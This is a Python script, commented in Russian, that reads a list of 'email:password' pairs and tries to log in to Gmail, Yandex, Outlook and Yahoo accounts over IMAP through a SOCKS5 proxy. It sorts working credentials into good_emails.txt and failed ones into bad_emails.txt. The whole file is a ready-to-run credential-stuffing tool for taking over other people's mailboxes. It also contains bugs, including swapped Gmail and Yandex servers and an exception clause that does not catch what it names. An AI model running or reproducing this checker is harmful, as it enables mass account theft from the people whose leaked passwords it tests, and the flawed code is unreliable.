import ssl
import time
import socks
import os

from imaplib import IMAP4
from imaplib import IMAP4_PORT
from imaplib import IMAP4_SSL_PORT

class SocksIMAP4(IMAP4):
    """
    IMAP service trough SOCKS proxy. PySocks module required.
    """

    PROXY_TYPES = {"socks4": socks.PROXY_TYPE_SOCKS4,
                   "socks5": socks.PROXY_TYPE_SOCKS5,
                   "http": socks.PROXY_TYPE_HTTP}

    def __init__(self, host, port=IMAP4_PORT, proxy_addr=None, proxy_port=None,
                 rdns=True, username=None, password=None, proxy_type="socks5", timeout=None):
        self.proxy_addr = proxy_addr
        self.proxy_port = proxy_port
        self.rdns = rdns
        self.username = username
        self.password = password
        self.proxy_type = SocksIMAP4.PROXY_TYPES[proxy_type.lower()]

        IMAP4.__init__(self, host, port, timeout)

    def _create_socket(self, timeout=None):
        return socks.create_connection((self.host, self.port), proxy_type=self.proxy_type, proxy_addr=self.proxy_addr,
                                       proxy_port=self.proxy_port, proxy_rdns=self.rdns, proxy_username=self.username,
                                       proxy_password=self.password, timeout=timeout)

class SocksIMAP4SSL(SocksIMAP4):

    def __init__(self, host='', port=IMAP4_SSL_PORT, keyfile=None, certfile=None, ssl_context=None, proxy_addr=None,
                 proxy_port=None, rdns=True, username=None, password=None, proxy_type="socks5", timeout=None):

        if ssl_context is not None and keyfile is not None:
            raise ValueError("ssl_context and keyfile arguments are mutually "
                             "exclusive")
        if ssl_context is not None and certfile is not None:
            raise ValueError("ssl_context and certfile arguments are mutually "
                             "exclusive")

        self.keyfile = keyfile
        self.certfile = certfile
        if ssl_context is None:
            ssl_context = ssl._create_stdlib_context(certfile=certfile,
                                                     keyfile=keyfile)
        self.ssl_context = ssl_context

        SocksIMAP4.__init__(self, host, port, proxy_addr=proxy_addr, proxy_port=proxy_port,
                            rdns=rdns, username=username, password=password, proxy_type=proxy_type, timeout=timeout)

    def _create_socket(self, timeout=None):
        sock = SocksIMAP4._create_socket(self, timeout=timeout)
        server_hostname = self.host if ssl.HAS_SNI else None
        return self.ssl_context.wrap_socket(sock, server_hostname=server_hostname)
    
    def open(self, host='', port=IMAP4_PORT, timeout=None):
        SocksIMAP4.open(self, host, port, timeout)

# Парсер почты, чтобы понять к какому серверу подключаться
def mail_to_server(email_address) -> str:
    try:
        imap_servers = ['imap.gmail.com', 'imap.yandex.com', 'outlook.office365.com', 'imap.mail.yahoo.com']
        if 'gmail' in email_address.split('@')[1].split('.')[0]:
            server = imap_servers[1]
        elif 'yandex' in email_address.split('@')[1].split('.')[0] or email_address.split('@')[1].split('.')[0] == 'ya':
            server = imap_servers[0]
        elif 'outlook' in email_address.split('@')[1].split('.')[0] or 'hotmail' in email_address.split('@')[1].split('.')[0]:
            server = imap_servers[2]
        elif 'yahoo' in email_address.split('@')[1].split('.')[0]:
            server = imap_servers[3]
    except Exception:
        server = ''
    return server

# Подключение к imap серверу
def connect_to_server_and_login(imap_server, imap_port, s5proxy, email_address, email_password, good_filename, bad_filename) -> bool:
    while True:
        try:
            imap = SocksIMAP4SSL(host=imap_server, port=imap_port, 
                            proxy_addr=s5proxy[0], proxy_port=int(s5proxy[1]), username=s5proxy[2], password=s5proxy[3], proxy_type='socks5')
            imap.login(email_address, email_password)
        except IMAP4.error as ex:
            if 'LOGIN failed' in str(ex):
                print(f'Error! {email_address}:{email_password}\t\t- ex is {str(ex)} ')
                with open(bad_filename, 'a+') as file:
                    file.write(email_address + ':' + email_password + '\n') 
                return
            else:
                time.sleep(1)
                continue
        except socks.ProxyConnectionError or socks.SOCKS5AuthError or Exception as ex:
            time.sleep(1)
            continue
        print(f'Connected! {email_address}:{email_password}')
        with open(good_filename, 'a+') as file:
                    file.write(email_address + ':' + email_password + '\n')
        return

# Основная функция проверки почты
def mail_check(list_with_emails, proxy):
    s5proxy = proxy.split(':')
    imap_port = 993
    good_filename = uniquify('./good_emails.txt')
    bad_filename = uniquify('./bad_emails.txt')
    for mail in list_with_emails:
        email_address = mail[0]
        email_password = mail[1]
        imap_server = mail_to_server(email_address)
        if imap_server:
            connect_to_server_and_login(imap_server, imap_port, s5proxy, email_address, email_password, good_filename, bad_filename)

# Парсер текстового файла через списочное выражение
def emailTextToList(txt) -> list:
    with open(txt) as file:
        return [line.strip().split(':') for line in file]

# Унифицируем путь к файлу
def uniquify(path):
    filename, extension = os.path.splitext(path)
    counter = 1
    while os.path.exists(f'{filename}({str(counter)}){extension}'):
        counter += 1
    return f'{filename}({str(counter)}){extension}'

if __name__ == '__main__':
    # В данном случае прокси типа socks5
    proxy = 'address:port:login:passwrd'
    # Текстовый файл в формате Почта:Пароль
    file_with_emails = './emails.txt'
    mail_check(emailTextToList(file_with_emails), proxy)
